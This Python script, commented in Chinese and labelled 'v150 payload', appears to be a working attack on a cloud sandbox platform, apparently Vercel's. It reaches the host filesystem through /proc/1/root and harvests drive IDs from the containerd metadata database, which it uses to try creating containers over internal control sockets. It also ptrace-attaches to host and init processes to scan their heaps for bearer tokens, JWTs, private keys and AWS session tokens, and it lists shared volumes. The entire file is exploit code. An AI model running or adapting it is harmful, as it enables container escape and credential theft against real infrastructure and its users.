# -*- coding: utf-8 -*-
"""v150 payload: Create(drive_id=meta.db ID) + containerd List + Go 堆凭证扫描 + /volumes/share
输出 /vercel/sandbox/v150c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v150c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
USAGE = '/vercel.hive.cell.api.usage.v1.UsageService'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=3.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 500] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def readp(pid, name, n=6000):
    try:
        return open('/proc/%d/%s' % (pid, name), 'rb').read(n)
    except Exception as e:
        return b'EXC %s' % str(e).encode()


def mem_scan_heap(pid, kws, tag='', max_bytes=64 * 1024 * 1024, max_found=15, ctx=200):
    """只扫 Go 堆段 (0xc000000000 起始的 rw 段) + 其他小 rw 堆"""
    try:
        libc = ctypes.CDLL(None, use_errno=True)
        r = libc.ptrace(16, pid, 0, 0)
        log('%s PTRACE_ATTACH rc=%d errno=%d' % (tag, r, ctypes.get_errno()))
        if r != 0:
            return
        time.sleep(0.3)
        try:
            maps = open('/proc/%d/maps' % pid).read()
        except Exception:
            maps = ''
        targets = []
        for ln in maps.splitlines():
            parts = ln.split()
            if len(parts) < 2:
                continue
            a, b = parts[0].split('-')
            base = int(a, 16)
            size = int(b, 16) - base
            perm = parts[1]
            if perm[0] != 'r' or size < 4096:
                continue
            # Go 堆 (c000...) 或小 rw 段
            if base >= 0xc000000000 or (perm[1] == 'w' and size < 200 * 1024 * 1024):
                targets.append((base, size, perm))
        log('%s heap regions=%d: %s' % (tag, len(targets), targets[:6]))
        total = 0
        found = 0
        for base, size, perm in targets:
            if total >= max_bytes or found >= max_found:
                break
            want = min(size, max_bytes - total)
            if want <= 0:
                continue
            try:
                mf = open('/proc/%d/mem' % pid, 'rb')
                mf.seek(base)
                chunk = mf.read(want)
                mf.close()
                total += len(chunk)
                for kw in kws:
                    if found >= max_found:
                        break
                    for m in re.finditer(re.escape(kw), chunk):
                        s = max(0, m.start() - ctx)
                        seg = chunk[s:m.end() + ctx]
                        # 过滤纯二进制常量 (ASCII 可读比例低)
                        if len(seg) > 0:
                            printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                            if printable * 10 < len(seg) * 4:
                                continue
                        log('%s MEM %s %s @0x%x: %r' % (tag, pid, kw, base + m.start(), seg))
                        found += 1
                        if found >= max_found:
                            break
            except Exception as e:
                log('%s mem EXC %s' % (tag, e))
        log('%s heap scan done bytes=%d found=%d' % (tag, total, found))
        libc.ptrace(17, pid, 0, 0)
    except Exception as e:
        log('%s ptrace EXC %s' % (tag, e))


# ============ 1: Create drive_id (meta.db ID) ============
log('=== 1 Create drive_id ===')
meta_db = R + '/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db'
drive_cands = []
try:
    data = open(meta_db, 'rb').read()
    for m in re.finditer(rb'hvc_iad1_[A-Za-z0-9_]{10,80}', data):
        s = m.group().decode(errors='replace')
        if s not in drive_cands:
            drive_cands.append(s)
except Exception as e:
    log('meta read EXC %s' % e)
log('drive_cands from meta.db: %s' % drive_cands)
for did in drive_cands:
    st, pay = raw_req(CELL, '%s/Create' % CTRS, json.dumps({'drive_id': did}).encode(), t=4)
    log('Create drive_id=%r -> %s %r' % (did, st, pay[:400]))
    if '200' in st:
        log('!!! SUCCESS drive_id=%r -> %r' % (did, pay[:800]))
        # 成功后 Start 验证
        try:
            cid = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
            if cid:
                log('containerId=%s' % cid.group(1).decode())
        except Exception:
            pass

# ============ 2: containerd List (带 gRPC 帧) ============
log('=== 2 containerd list ===')
try:
    import subprocess
    tmp = '/vercel/sandbox/curl_req.bin'
    open(tmp, 'wb').write(b'\x00\x00\x00\x00\x00')  # gRPC 空帧
    hdr = '/vercel/sandbox/curl_hdr.txt'
    csock = R + '/run/containerd/containerd.sock'
    cmd = ['curl', '-sS', '--max-time', '6', '--http2-prior-knowledge',
           '--unix-socket', csock, '-X', 'POST',
           '-H', 'Content-Type: application/grpc', '-H', 'containerd-namespace: default',
           '-D', hdr, '--data-binary', '@%s' % tmp,
           'http://unix/containerd.services.containers.v1.Containers/List']
    r = subprocess.run(cmd, capture_output=True, timeout=8)
    out = r.stdout
    log('CTR List len=%d' % len(out))
    # 提取容器信息: protobuf 里的 name/image/labels
    for m in re.finditer(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', out):
        log('CTR uuid %s' % m.group().decode())
    for m in re.finditer(rb'(?:ctr_|v1[0-9][0-9][a-z])[A-Za-z0-9_]{4,40}', out):
        log('CTRID %s' % m.group().decode())
    for m in re.finditer(rb'hvc_iad1_[A-Za-z0-9_]{10,80}', out):
        log('CTR hvc %s' % m.group().decode())
    log('CTR raw: %r' % out[:1200])
except Exception as e:
    log('containerd list EXC %s' % e)

# ============ 3: meta.db 全字符串 ============
log('=== 3 meta.db strings ===')
try:
    data = open(meta_db, 'rb').read()
    strs = set()
    for m in re.finditer(rb'[\x20-\x7e]{8,}', data):
        s = m.group().decode(errors='replace')
        if any(k in s for k in ['hvc', 'ctr', 'sandbox', 'cell', 'drive', 'container', 'snapshot', 'workload', 'b01540']):
            strs.add(s)
    for s in sorted(strs)[:80]:
        log('META %s' % s)
except Exception as e:
    log('meta strings EXC %s' % e)

# ============ 4: celld Go 堆扫描 ============
log('=== 4 celld heap ===')
try:
    mem_scan_heap(1,
                  [b'eyJ', b'Bearer ', b'Authorization:', b'authorization:',
                   b'hvc_iad1', b'PRIVATE KEY-----', b'AWS_SESSION_TOKEN', b'x-amz-'],
                  tag='celld', max_bytes=48 * 1024 * 1024, max_found=12, ctx=250)
except Exception as e:
    log('celld heap EXC %s' % e)

# ============ 5: sandbox-init 堆扫描 ============
log('=== 5 init heap ===')
try:
    init_pid = None
    for d in sorted(os.listdir(R + '/run/cell/runc')):
        try:
            init_pid = int(open(R + '/run/cell/runc/%s/container.pid' % d).read().strip())
        except Exception:
            pass
    if init_pid:
        mem_scan_heap(init_pid,
                      [b'eyJ', b'Bearer ', b'Authorization:', b'hvc_iad1',
                       b'PRIVATE KEY-----', b'init.sock'],
                      tag='init', max_bytes=48 * 1024 * 1024, max_found=12, ctx=250)
except Exception as e:
    log('init heap EXC %s' % e)

# ============ 6: /volumes/run/vercel/share ============
log('=== 6 share dir ===')
for p in [R + '/volumes/run/vercel', R + '/volumes/run/vercel/share']:
    try:
        for name in sorted(os.listdir(p))[:40]:
            fp = p + '/' + name
            try:
                st = os.stat(fp)
                if st.st_mode & 0o170000 == 0o040000:
                    log('DIR %s/ = %s' % (fp, sorted(os.listdir(fp))[:25]))
                elif st.st_mode & 0o170000 != 0o140000:
                    data = open(fp, 'rb').read(1500)
                    log('FILE %s (%d): %r' % (fp, st.st_size, data[:600]))
                else:
                    log('SOCK %s' % fp)
            except Exception as e:
                log('%s EXC %s' % (fp, e))
    except Exception as e:
        log('ls %s EXC %s' % (p, e))

log('V150_DONE')
f.close()
